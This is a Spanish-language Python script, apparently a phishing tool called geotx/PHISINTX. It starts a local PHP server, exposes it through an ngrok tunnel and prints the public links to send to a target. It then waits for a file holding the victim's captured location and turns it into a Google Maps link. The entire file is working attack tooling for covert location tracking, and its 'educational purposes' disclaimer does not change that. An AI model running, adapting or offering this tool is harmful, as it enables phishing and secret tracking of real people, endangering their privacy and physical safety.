import os, sys, time, io,re
import random
while True:
 try:
  import requests
  break
 except ModuleNotFoundError:
  os.system("pip install requests")

while True:
 try:
  from lolpython import lol_py
  break
 except ModuleNotFoundError:
  os.system("pip install lolpython")

class color:
    morado = '\033[95m'
    blanco = '\033[97m'
    cyan = '\033[96m'
    azul  = '\033[94m'
    verde = '\033[92m'
    amarillo = '\033[93m'
    rojo = '\033[91m'
    fin = '\033[0m'

r= requests.get("https://raw.githubusercontent.com/Fenrir-00/geotx/master/version.txt")
r=r.text
print(r)
if r != "version=1.0\n":
 os.system("clear")
 print(f"""{color.rojo}HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO""")
 time.sleep(5)

def banner():
 os.system("clear")
 print(f"""{color.cyan}

 ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
██╔════╝ ██╔════╝██╔══██╗╚══██╔══╝╚██╗██╔╝
██║  ██╗ █████╗  ██║  ██║   ██║    ╚███╔╝
██║  ╚██╗██╔══╝  ██║  ██║   ██║    ██╔██╗
╚██████╔╝███████╗╚█████╔╝   ██║   ██╔╝╚██╗
 ╚═════╝ ╚══════╝ ╚════╝    ╚═╝   ╚═╝  ╚═╝{color.fin}""")
def contacto():
 texto ="""
 |=======================================================|
 | Script by              : #FENRIR-00                   |
 | Version                : Version  1.0                 |
 | Follow me on Github    : https://github.com/Fenrir-00 |
 | Contact me on Telegram : @Ritorito1990                |
 ========================================================= """
 lol_py(texto)

def incorrecto():
    os.system("clear")
    print(f"""{color.rojo}
 █████╗ ██████╗  █████╗ ██╗ █████╗ ███╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗ ██║
██║  ██║██████╔╝██║  ╚═╝██║██║  ██║██╔██╗██║
██║  ██║██╔═══╝ ██║  ██╗██║██║  ██║██║╚████║
╚█████╔╝██║     ╚█████╔╝██║╚█████╔╝██║ ╚███║
 ╚════╝ ╚═╝      ╚════╝ ╚═╝ ╚════╝ ╚═╝  ╚══╝
██╗███╗  ██╗ █████╗  █████╗ ██████╗ ██████╗
██║████╗ ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║██╔██╗██║██║  ╚═╝██║  ██║██████╔╝██████╔╝
██║██║╚████║██║  ██╗██║  ██║██╔══██╗██╔══██╗
██║██║ ╚███║╚█████╔╝╚█████╔╝██║  ██║██║  ██║
╚═╝╚═╝  ╚══╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
███████╗ █████╗ ████████╗ █████╗
██╔════╝██╔══██╗╚══██╔══╝██╔══██╗
█████╗  ██║  ╚═╝   ██║   ███████║
██╔══╝  ██║  ██╗   ██║   ██╔══██║
███████╗╚█████╔╝   ██║   ██║  ██║
╚══════╝ ╚════╝    ╚═╝   ╚═╝  ╚═╝{color.fin}""")
    time.sleep(4)

def ayuda():
 banner()
 contacto()
 print(f"""

  {color.morado}.      PHISINTX{color.verde}

[✓]  HERRAMIENTA CREADA CON FINES EDUCATIVOS.

[✓]  NECESARIO TENER PUESTO EL AUTOTOKEN EN NROK.

[✓]  SOLO FUNCIONA CON DATOS.

[✓]  HAY QUE ACTIVAR EL PUNTO DE ACCESO WIFI.

""")
 input(f"{color.cyan} PULSA CUALQUIER TECLA PARA CONTINUAR >>>{color.fin}")
 inicio()

def pagina():
 banner()
 contacto()
 os.system("./ngrok http 8080 &>/dev/null & clear")
 os.system("rm ubicacion.txt")
 os.system("php -S localhost:8080 &>/dev/null & clear")
 time.sleep(3)
 link()
 while True:
  banner()
  contacto()
  try:
   print(f"""{color.azul}

##########################################################
""")
   archivo = open("ubicacion.txt")
   print(f"""{color.amarillo}
[*]HEMOS ENCONTRADO LA UBICACION DEL USUARIO{color.verde}
""")
   print()
   ubicacion = archivo.read()
   print(ubicacion)
   archivo.close()
   resultado = re.sub('[a-zA-Z\s:]', '', ubicacion)
   print("https://www.google.com/maps/search/?api=1&query="+(resultado))
   resultado =f"https://www.google.com/maps/search/?api=1&query="+(resultado)

   print(f"""{color.azul}

###########################################################
{color.fin}""")
   break
  except:
   print(f"""{color.amarillo}
[*]ESPERANDO A QUE PONGA LA UBICACIO EL USUARIO{color.fin}""")
   print(f"""{color.azul}

##########################################################
{color.fin}""")
  time.sleep(10)

def inicio():
 banner()
 contacto()
 print(f"""{color.morado}
            QUE TEGUSARIA HACER
""")
 print(f"{color.verde}[1]GEOLOCALIZAR")
 print(f"{color.amarillo}[2]AYUDA")
 print(f"{color.rojo}[0]SALIR{color.fin}")
 eleccion = input(f"{color.cyan}ELIGE UN NUMERO >> {color.fin}")
 if eleccion == "1":
  pagina()
 elif eleccion == "2":
  ayuda()
 elif eleccion =="0":
  os.system("clear")
  exit()
 else:
  incorrecto()
  inicio()

def link():
 banner()
 contacto()
 try:
  r= requests.get("http://127.0.0.1:4040/api/tunnels")
  f = r.json()
  d = f["tunnels"]
  lista = []
  for v in d:
   lista.append(v["public_url"])
  print(f"""{color.cyan}
 ################ AQUI ESTAN LOS ENLACES #################
{color.verde}""")

  print(f"""[✓]{color.amarillo}link https: {lista[0]}{color.verde}
""")
  print(f"""[✓]{color.amarillo}link http: {lista[1]}{color.verde}
""")
  print(f"""[✓]{color.amarillo}link localhost: http://localhost:8080/{color.azul}
""")
  input("PULSA CUALQUIER TECLA PARA SEGUIR >>")
 except:
  banner()
  contacto()
  print(f"""

  {color.rojo}      POSIBLES ERRORES{color.verde}

[✓]  NECESARIO TENER PUESTO EL AUTOTOKEN EN NROK.

[✓]  SOLO FUNCIONA CON DATOS.

[✓]  HAY QUE ACTIVAR EL PUNTO DE ACCESO WIFI.

""")
  time.sleep(7)
  pagina()
inicio()



